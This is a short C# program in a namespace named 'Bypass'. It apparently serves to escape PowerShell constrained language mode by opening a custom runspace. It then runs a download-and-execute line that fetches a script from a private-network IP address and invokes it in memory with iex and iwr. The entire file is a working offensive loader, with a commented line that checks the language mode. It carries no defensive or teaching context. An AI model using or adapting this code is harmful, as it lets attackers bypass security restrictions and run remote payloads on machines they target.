using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            //Create runspace for our PS session and open it
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            
            //Create a new PS object and assign the runspace to it
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            //Set PS cmd to string, add it to PS session, execute or invoke it and close the runspace
            //String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            String cmd = "iex(iwr http://192.168.49.113/run64.txt -UseBasicParsing)";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}